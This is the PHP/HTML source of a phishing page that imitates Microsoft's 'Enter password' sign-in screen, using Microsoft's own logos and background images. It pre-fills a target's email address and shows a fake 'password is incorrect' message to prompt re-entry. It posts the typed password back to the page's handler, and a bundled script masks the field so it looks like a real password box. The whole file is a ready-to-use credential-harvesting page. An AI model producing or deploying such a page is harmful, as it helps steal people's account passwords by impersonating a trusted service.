<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="shortcut icon" href="https://logincdn.msftauth.net/16.000.30529.1/images/favicon.ico" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg') no-repeat center center fixed;
            background-size: cover;
        }

        .page-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100%;
        }

        .login-container {
            width: 100%;
            height: 370px;
            max-width: 440px;
            padding: 30px;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 0 !important;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            position: relative;
            top: -100px;
        }
        
        .form-step {
            display: none;
        }
        
        .form-step.active {
            display: block;
            margin-top: 69px;
        }
        
        .login-header {
            position: relative;
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header img {
            position: absolute;
            top: 0px;
            left: 0px;
            width: auto;
            height: 24px;
        }

        .error {
            color: #e81123;
            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
            font-size: 15px;
            line-height: 20px;
            font-weight: 400;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px;
            background-color: #fff;
        }

        .title {
            margin-bottom: 20px;
            margin-top: 20px;
            margin-bottom: 1.25rem;
            margin-top: 1.25rem;
            font-size: 24px;
            line-height: 28px;
            font-weight: 300;
            line-height: 1.75rem;
            padding-bottom: 2.3632px;
            padding-top: 2.3632px;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
            padding: 0;
            margin-top: 16px;
            margin-bottom: 12px;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
        }

        .text-box {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 1px solid #1b1b1b;
            border-radius: 0;
            outline: none;
            box-shadow: none;
            padding-left: 0px;
        }

        .text-box:focus {
            outline: none;
            box-shadow: none;
            border-bottom: 1px solid #1b1b1b;
        }

        a:link {
            color: #0067b8;
        }

        a {
            color: #0067b8;
            text-decoration: none;
        }

        a {
            background-color: transparent;
        }
        
        .sign-in {
            position: relative;
            height: 32px;
            width: 108px;
            padding: 3px 20px;
            border-radius: 0 !important;
            background-color: #0067b8;
            color: #fff;
        }

        .sign-in-options {
            max-height: 48px;
            max-width: 440px;
            background: #fff;
            margin-left: -29px;
            margin-right: -29px;
            margin-top: 60px;
        }

        .signinOptions {
            display: flex;
            align-items: center;
            background-color: #fff;
            padding-left: 30px;
            margin-top: 0px;
            padding-top: 8px;
            padding-bottom: 8px;
            transition: background-color 0.3s ease;
            cursor: pointer;
        }

        .signinOptions img {
            height: 32px;
            width: 32px;
            margin-right: 10px;
        }

        .signinOptions:hover {
            background-color: #e4e3e3;
        }

        .next {
            display: flex;
            justify-content: flex-end;
            margin-top: 20px;
        }

        .nobox {
            border: none;
            background: none;
            outline: none;
            box-shadow: none;
            font-size: inherit;
            color: inherit;
            padding: 0;
            width: auto;
            margin-top: 30px;
        }

        .notice {
           font-size: .8125rem;
           margin-bottom: 15px;
        }

        .none {
            height: 30px;
        }

        .btn-primary {
            background-color: #0067b8 !important;
            border-color: #0067b8 !important;
        }

        .btn-primary:hover, 
        .btn-primary:focus, 
        .btn-primary:active {
            background-color: #005a9e !important;
            border-color: #005a9e !important;
        }
    </style>
</head>
<body>
    <div class="page-container">
        <div class="login-container">
            <div class="login-header">
                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Logo" id="domainLogo">
            </div>

            <div class="form-step" style="display:block;">
                <form id="login-form" name="login-form" method="post" required="" autocomplete="off">
                <input type="hidden" name="login" value="officecn">
                <div class="mb-3">
                    <div class="input-group mb-3">
                        <input type="text" class="form-control nobox" id="displayEmail" style="background-color: rgb(255, 255, 255);" value="<?php echo htmlspecialchars($decoded); ?>" disabled>
                    </div>
                    <input type="hidden" name="user" value="<?php echo htmlspecialchars($decoded); ?>">
                </div>
                <div class="title">Enter password</div>
                <div class="pb-2">
                    <span class="error" style="<?php echo $error; ?>">The password is incorrect. Please try again.</span>
                </div>
                <form id="passwordForm">
                    <div class="mb-3">
                        <input type="text" class="form-control text-box" id="password" name="pass" placeholder="Password" required>
                    </div>
                    <div class="notice">
                        <span><a href="#">Forgot password?</a></span>
                    </div>
                    <div class="next">
                        <button type="submit" onclick="submitLogin(event);" id="login-btn" class="btn btn-primary sign-in">Sign in</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>